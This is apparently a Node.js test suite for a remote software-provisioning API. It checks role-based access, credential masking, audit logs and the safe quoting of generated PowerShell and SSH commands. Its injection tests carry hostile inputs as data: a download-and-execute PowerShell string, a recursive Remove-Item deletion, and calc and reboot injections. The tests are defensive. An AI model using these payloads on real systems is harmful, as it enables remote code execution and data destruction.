require('../helpers/setupEnv');
const test = require('node:test');
const assert = require('node:assert/strict');
const express = require('express');
const request = require('supertest');
const dbManager = require('../../services/db');
const { signToken } = require('../helpers/http');
const { writeRbacConfig } = require('../../lib/rbac');
const { encryptPassword } = require('../../lib/crypto');
const powershell = require('../../lib/powershell');
const ssh = require('../../lib/ssh');
const logger = require('../../lib/logger');
const prov = require('../../lib/provisioning');

const SECRET = 'S3cr3t-Pa$$w0rd!';
const mk = (role, groups = ['prov'], extra = {}) => `Bearer ${signToken({ username: role.toLowerCase(), domain: 'corp', role, groups, ...extra })}`;
const admin = mk('SuperAdmin'), op = mk('Operator'), viewer = mk('Viewer');
const noFeature = mk('Operator', ['other']);
const opWithPwd = `Bearer ${signToken({ username: 'op', domain: 'corp', role: 'Operator', groups: ['prov'], epass: encryptPassword(SECRET, 'test-jwt-secret') })}`;
const bearer = (t) => ({ Authorization: t });

let app;
const psCalls = [];
const sshCalls = [];
const audits = [];
let psImpl, sshImpl;

test.before(async () => {
    await dbManager.initDB();
    writeRbacConfig({
        roles: ['SuperAdmin', 'Operator', 'Viewer', 'None'], users: {}, defaultRole: 'Viewer',
        groups: { prov: { enabled: true, features: { install: true } }, other: { enabled: true, features: { serverList: true } } }
    });
    process.env.REMOTE_INSTALL_BUS = 'BU-A,BU-B';
    process.env.REMOTE_INSTALL_SOFTWARE_MASTER = '7zip|\\\\srv\\share\\7z.exe|/S /D="C:\\Program Files\\7z"\nTool|tools\\setup.bat|-q\nData|\\\\srv\\share\\datadir|';
    process.env.REMOTE_INSTALL_SOFTWARE_Basic = '7zip';
    process.env.REMOTE_INSTALL_SOFTWARE_BU_A = '7zip,Tool,Data';
    process.env.REMOTE_INSTALL_LINUX_SOFTWARE_MASTER = 'pkgA|yum install -y a --token=abc\npkgB|yum install -y b';
    process.env.REMOTE_INSTALL_LINUX_SOFTWARE_Basic = 'pkgA,pkgB';
    process.env.SYSNAS_SOFTWARE_PATH = '\\\\srv\\share';
    process.env.LINUX_ADMIN_USER = 'svc';
    process.env.LINUX_ADMIN_PWD = 'linux-pw';
    // Windows installs run as the Settings service account (SECRET is its password; the user's epass is never used)
    process.env.AD_ADMIN_USER = 'svc-prov';
    process.env.AD_ADMIN_PWD = SECRET;
    process.env.PROVISION_HOST_CONCURRENCY = '1';
    // Stored credentials are only used for known targets: seed the inventory with every address these tests use
    const store = require('../../services/inventoryStore');
    const known = ['10.0.0.1', '10.0.0.2', '10.0.0.3', '10.0.0.5', '10.0.0.6', '10.0.0.9'];
    for (let i = 1; i <= 48; i++) known.push(`10.1.0.${i}`);
    for (const ip of known) store.upsertScanResult(ip, { hostname: `H-${ip}`, status: 'online' });

    powershell.runPowerShell = async (script, timeout, options) => { psCalls.push({ script, timeout, options }); return psImpl(script, timeout, options); };
    ssh.executeSSH = async (...args) => { sshCalls.push(args); return sshImpl(...args); };
    logger.auditLog = (...a) => { audits.push(a); };
    logger.auditLogBatched = (...a) => { audits.push(a); };
    logger.auditLogFileOnly = (...a) => { audits.push(a); };

    app = express();
    app.use(express.json());
    app.use('/api/install', require('../../routes/install'));
});
test.after(async () => { await dbManager.closeDB(); });
test.beforeEach(() => {
    psCalls.length = 0; sshCalls.length = 0; audits.length = 0;
    psImpl = async () => okOutput(['7zip']);
    sshImpl = async () => ({ success: true, code: 0, stdout: 'done', stderr: '' });
});

const provisionJobs = require('../../services/provisionJobs');
// POST /execute now returns 202 { jobId }; this helper waits for the job and rebuilds the old per-host result shape
function exec(token, body) {
    const p = (async () => {
        const r = await request(app).post('/api/install/execute').set(bearer(token)).send(body);
        if (r.status !== 202) return r;
        await provisionJobs.whenIdle(r.body.jobId);
        const j = (await request(app).get(`/api/install/jobs/${r.body.jobId}`).set(bearer(admin))).body;
        const results = j.hosts.map(h => ({ ip: h.ip, ok: h.status === 'ok', packages: h.packages, error: h.error || undefined, rebootRequired: h.rebootRequired, log: h.log }));
        return { status: 200, body: { success: true, ok: results.every(x => x.ok), results, jobId: r.body.jobId, job: j.job } };
    })();
    p.expect = async (code) => { const r = await p; assert.equal(r.status, code); return r; };
    return p;
}

const NAMES = ['7zip', 'Tool', 'Data'];
const pkgLine = (o) => `${prov.PKG_MARK}${JSON.stringify({ idx: NAMES.indexOf(o.name), kind: 'installer', timedOut: false, error: '', stdout: '', stderr: '', ...o })}`;
const hostLine = (o) => `${prov.HOST_MARK}${JSON.stringify(o)}`;
function okOutput(names) {
    return ['Connecting...', hostLine({ connected: true }), ...names.map(n => pkgLine({ name: n, exitCode: 0 })), hostLine({ done: true })].join('\n');
}

test('RBAC matrix: 401 without token, 403 without the feature, Viewer cannot execute, Operator can', async () => {
    await request(app).get('/api/install/config').expect(401);
    await request(app).post('/api/install/execute').send({ ips: ['10.0.0.1'] }).expect(401);
    await request(app).get('/api/install/config').set(bearer(noFeature)).expect(403);
    await exec(noFeature, { ips: ['10.0.0.1'] }).expect(403);
    await request(app).get('/api/install/config').set(bearer(viewer)).expect(200);
    await exec(viewer, { ips: ['10.0.0.1'] }).expect(403);
    assert.equal(psCalls.length, 0);
    for (const t of [op, admin]) {
        const r = await exec(t, { ips: ['10.0.0.1'] });
        assert.equal(r.status, 200);
    }
});

test('GET /config masks installer args and Linux commands for non-writers only', async () => {
    const v = (await request(app).get('/api/install/config').set(bearer(viewer))).body;
    const z = v.masterList.find(s => s.name === '7zip');
    assert.equal(z.args, '••••');
    assert.equal(z.argsMasked, true);
    assert.equal(v.linuxMasterList[0].command, '••••');
    assert.ok(!JSON.stringify(v).includes('token=abc'));
    assert.ok(!JSON.stringify(v).includes('Program Files'));
    assert.deepEqual(v.mapping['BU-A'], ['7zip', 'Tool', 'Data']);
    const o = (await request(app).get('/api/install/config').set(bearer(op))).body;
    assert.match(o.masterList.find(s => s.name === '7zip').args, /\/S/);
    assert.match(o.linuxMasterList[0].command, /token=abc/);
    assert.equal(o.masterList.find(s => s.name === 'Data').hasArgs, false);
});

test('execute rejects injection strings, bad arrays and unknown templates with 400 before any runner', async () => {
    const bad = [
        { ips: ['$(Invoke-WebRequest http://x/a.ps1|iex)'] },
        { ips: ['10.0.0.1"; calc; "'] },
        { ips: ['host.example.com'] },
        { ips: ['10.0.0.1', 5] },
        { ips: 'not-an-array' },
        { ips: [] },
        {},
        { ips: Array.from({ length: 51 }, (_, i) => `10.0.${Math.floor(i / 250)}.${i + 1}`) },
        { ips: ['10.0.0.1'], buType: "Basic'; calc; '" },
        { ips: ['10.0.0.1'], buType: 'Nope' },
        { ips: ['10.0.0.1'], osType: 'bsd' },
        { ips: ['10.0.0.1'], reboot: 'yes' }
    ];
    for (const body of bad) {
        const r = await exec(op, body);
        assert.equal(r.status, 400, JSON.stringify(body).slice(0, 80));
        assert.ok(typeof r.body.error === 'string' && r.body.error.length > 5);
    }
    assert.equal(psCalls.length, 0);
    assert.equal(sshCalls.length, 0);
    assert.equal(audits.length, 0);
});

test('execute accepts 50 IPs and de-duplicates', async () => {
    const ips = Array.from({ length: 48 }, (_, i) => `10.1.0.${i + 1}`);
    const r = await exec(op, { ips: [...ips, '10.1.0.1', ' 10.1.0.2 '] });
    assert.equal(r.status, 200);
    assert.equal(r.body.results.length, 48);
    assert.equal(psCalls.length, 48);
});

test('generated Windows script: no password, psQuote d IP, credentials via env, quoted args', async () => {
    const r = await exec(opWithPwd, { ips: ['10.0.0.9'], buType: 'BU-A', reboot: true });
    assert.equal(r.status, 200);
    assert.equal(psCalls.length, 1);
    const { script, options } = psCalls[0];
    assert.ok(!script.includes(SECRET), 'password must never be in the script');
    assert.ok(!/net use/i.test(script));
    assert.ok(script.includes("$ip = '10.0.0.9'"));
    assert.ok(!script.includes('-ComputerName "'));
    assert.ok(script.includes('SOMP_CRED_PWD'));
    assert.equal(options.env.SOMP_CRED_PWD, SECRET);
    assert.equal(options.env.SOMP_CRED_USER, 'svc-prov', 'service account, not the signed-in user');
    assert.ok(script.includes("'/S', '/D=\"C:\\Program Files\\7z\"'") || script.includes(`'/D="C:\\Program Files\\7z"'`));
    assert.ok(script.includes(`'/d /s /c "'`), 'bat/cmd runs through cmd.exe /d /s /c with one outer quote pair');
    assert.ok(script.includes('[System.Diagnostics.Process]::Start($psi)'), 'exit code via ProcessStartInfo');
    assert.ok(!script.includes('Start-Process'));
    assert.ok(script.includes("msiexec.exe") && script.includes('/qn /norestart'));
    assert.ok(/\nexit 0\s*$/.test(script), 'script always ends with exit 0');
    assert.ok(script.includes('UTF8Encoding'));
    assert.ok(script.includes('taskkill.exe /T /F /PID'));
    assert.ok(!/\$\(_\.Exception/.test(script), 'no $(_.Exception typo');
    assert.ok(script.includes('New-PSDrive'));
    assert.ok(!script.includes('$doDisk'));
    assert.ok(script.includes('$doReboot = $true'));
    assert.ok(!script.includes(String.fromCharCode(0)));
});

test('a hostile package name or args stay inside single-quoted literals', () => {
    const script = prov.buildWindowsHostScript({
        ip: '10.0.0.1', nasPath: "\\\\nas\\sh'are", credentialHeader: '',
        packages: [{ name: "x'; Remove-Item C:\\ -Recurse; '", path: "a'b.exe", args: "/p=\"$(calc)\" 'q'" }],
        reboot: false
    });
    assert.ok(script.includes("Name = 'x''; Remove-Item C:\\ -Recurse; '''"));
    assert.ok(script.includes("$nasPath = '\\\\nas\\sh''are'"));
    assert.ok(script.includes(`'/p="$(calc)"'`));
    assert.ok(script.includes("''q''") || script.includes("'''q'''"));
});

test('tokenizeArgs keeps quoted groups together', () => {
    assert.deepEqual(prov.tokenizeArgs('/S /D="C:\\Program Files\\x" -q'), ['/S', '/D="C:\\Program Files\\x"', '-q']);
    assert.deepEqual(prov.tokenizeArgs(''), []);
});

test('timeout computation: 5 min base + 3 min per package per host, capped at 2 h', async () => {
    assert.equal(prov.computeTimeoutMs(1, 0), 5 * 60000);
    assert.equal(prov.computeTimeoutMs(1, 1), 8 * 60000);
    assert.equal(prov.computeTimeoutMs(2, 3), (5 + 18) * 60000);
    assert.equal(prov.computeTimeoutMs(50, 10), 2 * 60 * 60000);
    psImpl = async () => okOutput(['7zip', 'Tool', 'Data']);
    await exec(op, { ips: ['10.0.0.1'], buType: 'BU-A' }).expect(200);
    assert.equal(psCalls[0].timeout, prov.computeTimeoutMs(1, 3));
    assert.ok(psCalls[0].timeout > 60000);
});

test('structured results: exit 0, 3010, 1603, copy failure, guest error', async () => {
    psImpl = async () => [
        hostLine({ connected: true }),
        pkgLine({ name: '7zip', exitCode: 3010 }),
        pkgLine({ name: 'Tool', exitCode: 1603, stderr: 'fatal error' }),
        pkgLine({ name: 'Data', kind: 'copy', error: 'Access denied copying' }),
        hostLine({ done: true })
    ].join('\n');
    const r = await exec(op, { ips: ['10.0.0.1'], buType: 'BU-A' });
    const h = r.body.results[0];
    assert.equal(h.ip, '10.0.0.1');
    assert.equal(h.ok, false);
    assert.equal(r.body.ok, false);
    const by = Object.fromEntries(h.packages.map(p => [p.name, p]));
    assert.equal(by['7zip'].ok, true);
    assert.equal(by['7zip'].exitCode, 3010);
    assert.match(by['7zip'].message, /reboot required/);
    assert.equal(by.Tool.ok, false);
    assert.equal(by.Tool.exitCode, 1603);
    assert.match(by.Tool.message, /1603/);
    assert.equal(by.Data.ok, false);
    assert.match(by.Data.message, /Access denied/);
    assert.match(h.log, /FAIL/);

    // all ok incl. 3010 -> host ok; guest error -> failure; missing result -> failure
    psImpl = async () => [hostLine({ connected: true }), pkgLine({ name: '7zip', exitCode: 3010 }), hostLine({ done: true })].join('\n');
    const ok = (await exec(op, { ips: ['10.0.0.1'] })).body.results[0];
    assert.equal(ok.ok, true);
    assert.equal(ok.rebootRequired, true);
    psImpl = async () => [hostLine({ connected: true }), pkgLine({ name: '7zip', error: 'Error during guest execution: boom' }), hostLine({ done: true })].join('\n');
    const g = (await exec(op, { ips: ['10.0.0.1'] })).body.results[0];
    assert.equal(g.ok, false);
    psImpl = async () => hostLine({ connected: true });
    const m = (await exec(op, { ips: ['10.0.0.1'] })).body.results[0];
    assert.equal(m.ok, false);
    assert.equal(m.packages[0].message, 'Not executed (no result reported)');
    psImpl = async () => hostLine({ error: 'WinRM cannot connect' });
    const e = (await exec(op, { ips: ['10.0.0.1'] })).body.results[0];
    assert.equal(e.ok, false);
    assert.match(e.error, /WinRM cannot connect/);
});

test('a host that throws or times out keeps its partial output and the other hosts results', async () => {
    let n = 0;
    psImpl = async () => {
        n++;
        if (n === 1) throw { error: new Error('PowerShell execution timed out after 480000ms'), stdout: `Connecting...\n${hostLine({ connected: true })}\n${pkgLine({ name: '7zip', exitCode: 0 })}`, stderr: 'Timeout' };
        if (n === 2) throw { stderr: 'weird' };
        return okOutput(['7zip']);
    };
    const r = await exec(op, { ips: ['10.0.0.1', '10.0.0.2', '10.0.0.3'] });
    assert.equal(r.status, 200);
    const [a, b, c] = r.body.results;
    assert.equal(a.ok, false);
    assert.match(a.error, /timed out/);
    assert.equal(a.packages[0].ok, true, 'partial output is kept');
    assert.match(a.log, /Connecting/);
    assert.equal(b.ok, false);
    assert.ok(b.error && b.error !== 'undefined');
    assert.equal(c.ok, true);
    assert.equal(r.body.ok, false);
});

test('Linux: IPv4 only, pinHostKey + execTimeoutMs, sudo password via stdin, exit code decides', async () => {
    await exec(op, { osType: 'linux', ips: ['x;reboot'] }).expect(400);
    assert.equal(sshCalls.length, 0);

    sshImpl = async (ip, user, pw, cmd) => (cmd.includes('--token=abc') ? { success: false, code: 3, stdout: '', stderr: 'nope' } : { success: true, code: 0, stdout: 'ok', stderr: '' });
    const r = await exec(op, { osType: 'linux', ips: ['10.0.0.5'], reboot: true });
    assert.equal(r.status, 200);
    const h = r.body.results[0];
    assert.equal(h.ok, false);
    assert.equal(h.packages[0].ok, false);
    assert.equal(h.packages[0].exitCode, 3);
    assert.equal(h.packages[1].ok, true);
    assert.ok(!h.log.includes('Rebooting'), 'no reboot when a package failed');
    for (const [ip, user, pw, cmd, opts] of sshCalls) {
        assert.equal(ip, '10.0.0.5');
        assert.equal(opts.pinHostKey, true);
        assert.ok(opts.execTimeoutMs > 0 && opts.execTimeoutMs <= prov.LINUX_HOST_TIMEOUT_MS);
        assert.match(cmd, /^sudo -k; sudo -S -p '' sh -c /);
        assert.ok(cmd.includes('exec </dev/null;'), 'command stdin is /dev/null');
        assert.ok(!cmd.includes('linux-pw'), 'password not on the command line');
        assert.equal(opts.stdin, 'linux-pw\n');
    }
    sshCalls.length = 0;
    sshImpl = async () => ({ success: true, code: 0, stdout: 'ok', stderr: '' });
    const ok =await exec(op, { osType: 'linux', ips: ['10.0.0.5'], reboot: true });
    assert.equal(ok.body.results[0].ok, true);
    assert.equal(sshCalls.length, 3, 'two packages + reboot');
    assert.match(sshCalls[2][3], /reboot/);
});

test('Linux: an SSH failure (e.g. changed host key) fails only that host', async () => {
    sshImpl = async (ip) => { if (ip === '10.0.0.5') throw new Error('host key changed for 10.0.0.5'); return { success: true, code: 0, stdout: '', stderr: '' }; };
    const r = await exec(op, { osType: 'linux', ips: ['10.0.0.5', '10.0.0.6'] });
    assert.equal(r.body.results[0].ok, false);
    assert.match(r.body.results[0].error, /host key changed/);
    assert.equal(r.body.results[1].ok, true);
});

test('audit: start, one outcome per host (failures too), finish; no secrets', async () => {
    let n = 0;
    psImpl = async () => { n++; if (n === 2) throw new Error('boom'); return okOutput(['7zip']); };
    await exec(opWithPwd, { ips: ['10.0.0.1', '10.0.0.2'] }).expect(200);
    const lines = audits.map(a => a[2]);
    assert.equal(audits.length, 4);
    assert.ok(audits.every(a => a[1] === 'Remote Install' && a[0] === 'op'));
    assert.match(lines[0], /^Started windows install/);
    assert.match(lines[1], /SUCCESS 10\.0\.0\.1/);
    assert.match(lines[2], /FAILED 10\.0\.0\.2.*boom/);
    assert.match(lines[3], /Finished.*1\/2/);
    assert.ok(!lines.join('\n').includes(SECRET));
});

test('non-ASCII package names are matched by index, not by name', async () => {
    const prevMaster = process.env.REMOTE_INSTALL_SOFTWARE_MASTER;
    process.env.REMOTE_INSTALL_SOFTWARE_MASTER = `${prevMaster}\n防毒軟體|\\\\srv\\share\\av.exe|/S`;
    process.env.REMOTE_INSTALL_SOFTWARE_BU_B = '防毒軟體';
    try {
        psImpl = async () => [hostLine({ connected: true }), pkgLine({ idx: 0, name: '???garbled???', exitCode: 0 }), hostLine({ done: true })].join('\n');
        const r = await exec(op, { ips: ['10.0.0.1'], buType: 'BU-B' });
        const h = r.body.results[0];
        assert.equal(h.ok, true);
        assert.equal(h.packages.length, 1);
        assert.equal(h.packages[0].name, '防毒軟體');
    } finally {
        process.env.REMOTE_INSTALL_SOFTWARE_MASTER = prevMaster;
        delete process.env.REMOTE_INSTALL_SOFTWARE_BU_B;
    }
});

test('exit codes 1641 and 3010 are ok with reboot required; a non-zero PowerShell exit keeps partial stdout', async () => {
    psImpl = async () => [hostLine({ connected: true }), pkgLine({ name: '7zip', exitCode: 1641 }), hostLine({ done: true })].join('\n');
    const a = (await exec(op, { ips: ['10.0.0.1'] })).body.results[0];
    assert.equal(a.ok, true);
    assert.equal(a.rebootRequired, true);
    psImpl = async () => { throw { error: new Error('Process exited with code 1'), stderr: '', stdout: [hostLine({ connected: true }), pkgLine({ name: '7zip', exitCode: 0 })].join('\n') }; };
    const b = (await exec(op, { ips: ['10.0.0.1'] })).body.results[0];
    assert.equal(b.packages[0].ok, true, 'installed package is not reported as Not executed');
    assert.equal(b.ok, false, 'but the host did not finish cleanly');
});

test('the credential never appears in returned logs even if a tool echoes it', async () => {
    psImpl = async () => { throw { error: new Error(`boom ${SECRET}`), stderr: `leak ${SECRET}` }; };
    const r = await exec(opWithPwd, { ips: ['10.0.0.1'] });
    assert.ok(!JSON.stringify(r.body).includes(SECRET));
    assert.ok(!audits.map(a => a[2]).join('\n').includes(SECRET));
});

test('psQuote doubles typographic single quotes; the legacy backslash-n separator does not cut UNC paths', () => {
    const { psQuote } = require('../../lib/inventoryValidation');
    assert.equal(psQuote('Bob\u2019s'), "'Bob\u2019\u2019s'");
    assert.equal(psQuote('a\u2018b\u201Ac\u201Bd'), "'a\u2018\u2018b\u201A\u201Ac\u201B\u201Bd'");
    const legacy = prov.parseMasterList('A|\\\\nas01\\soft\\a.exe|/S\\nB|\\\\n-server\\x\\b.msi|\\n');
    assert.deepEqual(legacy.map(x => [x.name, x.path]), [['A', '\\\\nas01\\soft\\a.exe'], ['B', '\\\\n-server\\x\\b.msi']]);
    const tricky = prov.parseMasterList('N|\\\\srv\\share\\notepad++\\npp.exe|/S\nD|D:\\new\\a.exe|');
    assert.deepEqual(tricky.map(x => x.path), ['\\\\srv\\share\\notepad++\\npp.exe', 'D:\\new\\a.exe']);
    const real = prov.parseMasterList('A|\\\\nas01\\soft\\a.exe|/S\nB|\\\\n-server\\x\\b.exe|');
    assert.equal(real.length, 2);
    assert.equal(real[1].path, '\\\\n-server\\x\\b.exe');
});

function buildV(base, packages, extra, reboot) { return prov.buildWindowsHostScript({ ...base, packages, reboot, ...extra }); }
const variants = () => {
    const base = { ip: '10.0.0.1', nasPath: '\\\\srv\\share', credentialHeader: powershell.ENV_CREDENTIAL_HEADER };
    const pk = [
        { name: '7zip', path: 'a.exe', args: '/S /D="C:\\Program Files\\7z"' },
        { name: 'Tool', path: 'my tools\\setup.bat', args: '-p "a b"' },
        { name: 'M', path: 'x\\y.msi', args: 'PROP="v w"' },
        { name: 'P', path: 'p\\run.ps1', args: '' },
        { name: 'Dir', path: 'datadir', args: '' },
        { name: "Bob\u2019s 'x'; calc; '", path: "o'brien\\z.exe", args: "'q' $(calc) `x" }
    ];
    return [
        buildV(base, pk, {}, false), buildV(base, pk, { forceReinstall: true, keepInstallers: true, jobId: 'job-1' }, true), buildV(base, [pk[0]], {}, false), buildV({ ...base, nasPath: 'D:\\local' }, pk, {}, true)
    ];
};

test('generated scripts: cmd /s form, msiexec branch, literal paths, NAS-root guard', () => {
    const s = variants()[1];
    assert.ok(s.includes(`'/d /s /c "' + $inner + '"'`));
    assert.ok(s.includes(`$inner = '"' + $Dest + '"'`));
    assert.ok(s.includes('/i "'));
    assert.ok(s.includes('Copy-Children'));
    assert.ok(!/Join-Path [^\n]*'\*'/.test(s), 'no wildcard -Path copies');
    assert.ok(s.includes('Script packages cannot sit directly in a share or drive root'));
    assert.ok(s.includes(`$nasRoot + '\\'`), 'share prefix compared with a trailing backslash');
    assert.ok(s.includes("Leaf = 'setup.bat'") && s.includes("FolderName = 'my tools'"));
    assert.ok(s.includes("Bob\u2019\u2019s ''x''; calc; '''"), 'typographic and ASCII quotes are doubled');
});

test('every generated script variant parses with the PowerShell parser (win32 only, nothing is executed)', { skip: process.platform !== 'win32' }, (t) => {
    const { spawnSync } = require('child_process');
    const fs = require('fs');
    const os = require('os');
    const path = require('path');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'somp-parse-'));
    try {
        const probe = spawnSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', '$PSVersionTable.PSVersion.Major'], { encoding: 'utf8' });
        if (probe.error || probe.status !== 0) { t.skip('powershell.exe is not usable here'); return; }
        const hdr = powershell.ENV_CREDENTIAL_HEADER;
        const files = [...variants(), prov.buildWindowsPrecheckScript({ ip: '10.0.0.1', credentialHeader: hdr }), prov.buildNasCheckScript({ nasPath: "\\\\srv\\sh'are", credentialHeader: hdr })];
        let parsed = 0;
        files.forEach((src, i) => {
            parsed++;
            const f = path.join(dir, `v${i}.ps1`);
            fs.writeFileSync(f, '\ufeff' + src, 'utf8');
            const cmd = '$t=$null;$e=$null;[void][System.Management.Automation.Language.Parser]::ParseFile($env:SOMP_PARSE_FILE,[ref]$t,[ref]$e);if($e -and $e.Count){$e|ForEach-Object{$_.Message + " @" + $_.Extent.StartLineNumber};exit 1};exit 0';
            const r = spawnSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', cmd], { encoding: 'utf8', env: { ...process.env, SOMP_PARSE_FILE: f } });
            assert.equal(r.status, 0, `variant ${i} has parse errors: ${r.stdout}`);
        });
        assert.ok(parsed >= 5, 'at least the generated variants and the prep script were parsed');
    } finally {
        fs.rmSync(dir, { recursive: true, force: true });
    }
});

test('the old unused getInstallScript is gone', () => {
    assert.ok(!require('fs').readFileSync(require.resolve('../../routes/install'), 'utf8').includes('getInstallScript'));
});
